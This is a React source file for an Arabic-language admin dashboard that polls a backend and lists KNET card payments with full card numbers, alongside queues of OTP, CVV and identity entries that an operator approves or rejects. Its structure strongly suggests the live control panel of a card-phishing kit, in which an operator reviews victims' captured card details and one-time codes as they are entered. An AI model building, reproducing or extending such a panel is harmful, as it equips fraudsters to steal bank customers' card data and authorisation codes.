import { useState, useEffect } from "react";
import { useAuth } from "@/_core/hooks/useAuth";

interface Payment {
  id: number;
  cardNumber: string;
  amount: number;
  status: string;
  createdAt: string;
}

interface OTPRequest {
  id: number;
  paymentId: number;
  status: string;
  createdAt: string;
}

interface CVVRequest {
  id: number;
  paymentId: number;
  status: string;
  createdAt: string;
}

interface HawetyRequest {
  id: number;
  paymentId: number;
  status: string;
  createdAt: string;
}

export default function AdminDashboard() {
  const { user } = useAuth();
  const [activeTab, setActiveTab] = useState("payments");
  const [payments, setPayments] = useState<Payment[]>([]);
  const [otpRequests, setOtpRequests] = useState<OTPRequest[]>([]);
  const [cvvRequests, setCvvRequests] = useState<CVVRequest[]>([]);
  const [hawetyRequests, setHawetyRequests] = useState<HawetyRequest[]>([]);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 5000); // Refresh every 5 seconds
    return () => clearInterval(interval);
  }, []);

  const fetchData = async () => {
    setLoading(true);
    try {
      // Fetch pending payments
      const paymentsRes = await fetch("/api/admin/payments");
      if (paymentsRes.ok) {
        const data = await paymentsRes.json();
        setPayments(data);
      }

      // Fetch OTP requests
      const otpRes = await fetch("/api/admin/otp-requests");
      if (otpRes.ok) {
        const data = await otpRes.json();
        setOtpRequests(data);
      }

      // Fetch CVV requests
      const cvvRes = await fetch("/api/admin/cvv-requests");
      if (cvvRes.ok) {
        const data = await cvvRes.json();
        setCvvRequests(data);
      }

      // Fetch Hawety requests
      const hawetyRes = await fetch("/api/admin/hawety-requests");
      if (hawetyRes.ok) {
        const data = await hawetyRes.json();
        setHawetyRequests(data);
      }
    } catch (error) {
      console.error("Error fetching data:", error);
    } finally {
      setLoading(false);
    }
  };

  const handleApprove = async (type: string, id: number) => {
    try {
      const res = await fetch(`/api/admin/${type}/${id}/approve`, {
        method: "POST",
      });
      if (res.ok) {
        fetchData();
      }
    } catch (error) {
      console.error("Error approving:", error);
    }
  };

  const handleReject = async (type: string, id: number) => {
    try {
      const res = await fetch(`/api/admin/${type}/${id}/reject`, {
        method: "POST",
      });
      if (res.ok) {
        fetchData();
      }
    } catch (error) {
      console.error("Error rejecting:", error);
    }
  };

  // Check if user is admin
  if (user?.role !== "admin") {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="text-center">
          <h1 className="text-2xl font-bold text-red-600 mb-2">غير مصرح</h1>
          <p className="text-gray-600">أنت لا تملك صلاحيات الوصول إلى لوحة التحكم</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 p-4">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-3xl font-bold mb-8">لوحة التحكم</h1>

        {/* Tabs */}
        <div className="flex gap-4 mb-6 border-b">
          <button
            onClick={() => setActiveTab("payments")}
            className={`px-4 py-2 font-medium ${
              activeTab === "payments"
                ? "border-b-2 border-blue-600 text-blue-600"
                : "text-gray-600"
            }`}
          >
            طلبات KNET
          </button>
          <button
            onClick={() => setActiveTab("otp")}
            className={`px-4 py-2 font-medium ${
              activeTab === "otp"
                ? "border-b-2 border-blue-600 text-blue-600"
                : "text-gray-600"
            }`}
          >
            طلبات OTP
          </button>
          <button
            onClick={() => setActiveTab("cvv")}
            className={`px-4 py-2 font-medium ${
              activeTab === "cvv"
                ? "border-b-2 border-blue-600 text-blue-600"
                : "text-gray-600"
            }`}
          >
            طلبات CVV
          </button>
          <button
            onClick={() => setActiveTab("hawety")}
            className={`px-4 py-2 font-medium ${
              activeTab === "hawety"
                ? "border-b-2 border-blue-600 text-blue-600"
                : "text-gray-600"
            }`}
          >
            طلبات الهوية
          </button>
        </div>

        {/* Content */}
        <div className="bg-white rounded-lg shadow">
          {loading ? (
            <div className="p-8 text-center">جاري التحميل...</div>
          ) : (
            <>
              {activeTab === "payments" && (
                <div className="p-6">
                  <h2 className="text-xl font-bold mb-4">طلبات KNET</h2>
                  <table className="w-full">
                    <thead>
                      <tr className="border-b">
                        <th className="text-right p-2">رقم البطاقة</th>
                        <th className="text-right p-2">المبلغ</th>
                        <th className="text-right p-2">الحالة</th>
                        <th className="text-right p-2">التاريخ</th>
                        <th className="text-right p-2">الإجراءات</th>
                      </tr>
                    </thead>
                    <tbody>
                      {payments.length === 0 ? (
                        <tr>
                          <td colSpan={5} className="p-4 text-center text-gray-500">
                            لا توجد طلبات
                          </td>
                        </tr>
                      ) : (
                        payments.map((payment) => (
                          <tr key={payment.id} className="border-b">
                            <td className="p-2">{payment.cardNumber}</td>
                            <td className="p-2">{payment.amount} KD</td>
                            <td className="p-2">{payment.status}</td>
                            <td className="p-2">
                              {new Date(payment.createdAt).toLocaleDateString("ar")}
                            </td>
                            <td className="p-2 flex gap-2">
                              <button
                                onClick={() => handleApprove("payments", payment.id)}
                                className="px-3 py-1 bg-green-500 text-white rounded hover:bg-green-600"
                              >
                                موافقة
                              </button>
                              <button
                                onClick={() => handleReject("payments", payment.id)}
                                className="px-3 py-1 bg-red-500 text-white rounded hover:bg-red-600"
                              >
                                رفض
                              </button>
                            </td>
                          </tr>
                        ))
                      )}
                    </tbody>
                  </table>
                </div>
              )}

              {activeTab === "otp" && (
                <div className="p-6">
                  <h2 className="text-xl font-bold mb-4">طلبات OTP</h2>
                  <table className="w-full">
                    <thead>
                      <tr className="border-b">
                        <th className="text-right p-2">معرف الطلب</th>
                        <th className="text-right p-2">الحالة</th>
                        <th className="text-right p-2">التاريخ</th>
                        <th className="text-right p-2">الإجراءات</th>
                      </tr>
                    </thead>
                    <tbody>
                      {otpRequests.length === 0 ? (
                        <tr>
                          <td colSpan={4} className="p-4 text-center text-gray-500">
                            لا توجد طلبات
                          </td>
                        </tr>
                      ) : (
                        otpRequests.map((request) => (
                          <tr key={request.id} className="border-b">
                            <td className="p-2">{request.id}</td>
                            <td className="p-2">{request.status}</td>
                            <td className="p-2">
                              {new Date(request.createdAt).toLocaleDateString("ar")}
                            </td>
                            <td className="p-2 flex gap-2">
                              <button
                                onClick={() => handleApprove("otp", request.id)}
                                className="px-3 py-1 bg-green-500 text-white rounded hover:bg-green-600"
                              >
                                موافقة
                              </button>
                              <button
                                onClick={() => handleReject("otp", request.id)}
                                className="px-3 py-1 bg-red-500 text-white rounded hover:bg-red-600"
                              >
                                رفض
                              </button>
                            </td>
                          </tr>
                        ))
                      )}
                    </tbody>
                  </table>
                </div>
              )}

              {activeTab === "cvv" && (
                <div className="p-6">
                  <h2 className="text-xl font-bold mb-4">طلبات CVV</h2>
                  <table className="w-full">
                    <thead>
                      <tr className="border-b">
                        <th className="text-right p-2">معرف الطلب</th>
                        <th className="text-right p-2">الحالة</th>
                        <th className="text-right p-2">التاريخ</th>
                        <th className="text-right p-2">الإجراءات</th>
                      </tr>
                    </thead>
                    <tbody>
                      {cvvRequests.length === 0 ? (
                        <tr>
                          <td colSpan={4} className="p-4 text-center text-gray-500">
                            لا توجد طلبات
                          </td>
                        </tr>
                      ) : (
                        cvvRequests.map((request) => (
                          <tr key={request.id} className="border-b">
                            <td className="p-2">{request.id}</td>
                            <td className="p-2">{request.status}</td>
                            <td className="p-2">
                              {new Date(request.createdAt).toLocaleDateString("ar")}
                            </td>
                            <td className="p-2 flex gap-2">
                              <button
                                onClick={() => handleApprove("cvv", request.id)}
                                className="px-3 py-1 bg-green-500 text-white rounded hover:bg-green-600"
                              >
                                موافقة
                              </button>
                              <button
                                onClick={() => handleReject("cvv", request.id)}
                                className="px-3 py-1 bg-red-500 text-white rounded hover:bg-red-600"
                              >
                                رفض
                              </button>
                            </td>
                          </tr>
                        ))
                      )}
                    </tbody>
                  </table>
                </div>
              )}

              {activeTab === "hawety" && (
                <div className="p-6">
                  <h2 className="text-xl font-bold mb-4">طلبات الهوية</h2>
                  <table className="w-full">
                    <thead>
                      <tr className="border-b">
                        <th className="text-right p-2">معرف الطلب</th>
                        <th className="text-right p-2">الحالة</th>
                        <th className="text-right p-2">التاريخ</th>
                        <th className="text-right p-2">الإجراءات</th>
                      </tr>
                    </thead>
                    <tbody>
                      {hawetyRequests.length === 0 ? (
                        <tr>
                          <td colSpan={4} className="p-4 text-center text-gray-500">
                            لا توجد طلبات
                          </td>
                        </tr>
                      ) : (
                        hawetyRequests.map((request) => (
                          <tr key={request.id} className="border-b">
                            <td className="p-2">{request.id}</td>
                            <td className="p-2">{request.status}</td>
                            <td className="p-2">
                              {new Date(request.createdAt).toLocaleDateString("ar")}
                            </td>
                            <td className="p-2 flex gap-2">
                              <button
                                onClick={() => handleApprove("hawety", request.id)}
                                className="px-3 py-1 bg-green-500 text-white rounded hover:bg-green-600"
                              >
                                موافقة
                              </button>
                              <button
                                onClick={() => handleReject("hawety", request.id)}
                                className="px-3 py-1 bg-red-500 text-white rounded hover:bg-red-600"
                              >
                                رفض
                              </button>
                            </td>
                          </tr>
                        ))
                      )}
                    </tbody>
                  </table>
                </div>
              )}
            </>
          )}
        </div>
      </div>
    </div>
  );
}
